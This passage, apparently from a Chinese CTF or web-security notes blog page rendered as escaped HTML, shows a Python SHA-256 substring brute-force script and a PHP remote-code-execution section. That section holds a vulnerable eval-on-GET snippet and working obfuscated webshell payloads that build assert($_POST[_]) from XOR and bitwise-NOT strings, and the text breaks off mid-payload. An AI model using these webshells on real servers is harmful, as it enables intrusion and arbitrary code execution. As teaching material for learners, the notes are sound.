data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    key &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; sss&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;split&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;:&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    start &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;key&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;# 开始位置&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    end &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;key&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;# 结束位置&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    result &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;start&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; end&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;# print(sha256(i)[sha256start:sha256length])&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; sha256&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; keysha256&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;            &lt;span class=&#34;token comment&#34;&gt;# 拿到加密字符串&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            result &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; i&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;result&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;# 打印&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 参数列表&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;# 多线程的数字列表 开始与结尾&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10000000&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;:&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10000000&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pool &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ThreadPool&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;# 多线程任务&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pool&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;map&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;findsha256&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# 函数 与参数列表&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pool&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pool&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;join&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;rce-不包含数字和字母的webshell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rce-不包含数字和字母的webshell&#34;&gt;#&lt;/a&gt; RCE 不包含数字和字母的 webshell&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html&#34;&gt;https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;/[a-z0-9]/is&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;shell&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;shell&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;strong&gt;方法一：通过字符串执行异或得到字符串&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$_&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;%01&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;%13&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;%13&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;%05&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;%12&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;%14&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// $_=&#39;assert&#39;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$__&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;_&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;%0D&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;%2F&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;%0E&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;%09&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// $__=&#39;_POST&#39;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$___&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$$__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 关于这里的 $$__，为 php 中的特性可变变量，因此 $$__表示 $_POST&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$_&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$___&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;_&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// assert($_POST[_]);&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;strong&gt;方法二：取反&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$__&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&gt;&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&amp;lt;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&gt;&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&amp;lt;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$_&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$__&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$____&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$___&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;瞰&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$____&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$___&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$___&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;和&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$____&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$___&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$___&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;和&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$____&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$___&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$___&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;的&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$____&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$___&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$___&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;半&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$____&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$___&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$___&lt;/span&gt;&lt;span class=&#34;token 